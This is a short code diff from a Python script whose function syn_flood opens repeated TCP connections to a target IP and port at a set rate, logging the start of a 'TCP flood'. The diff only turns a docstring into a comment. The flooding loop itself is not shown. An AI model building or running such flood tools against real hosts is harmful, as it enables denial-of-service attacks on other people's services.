@@ -3,9 +3,7 @@ import time
 import random
 
 def syn_flood(target_ip, target_port, duration, rate):
-    """
-    Uses Python sockets to repeatedly connect (TCP) to the target at a specified rate.
-    """
+    # Uses Python sockets to repeatedly connect (TCP) to the target at a specified rate.
     print(f"[INFO] Starting TCP flood on {target_ip}:{target_port} for {duration}s at ~{rate} conn/s.")
     start_time = time.time()
     connection_count = 0
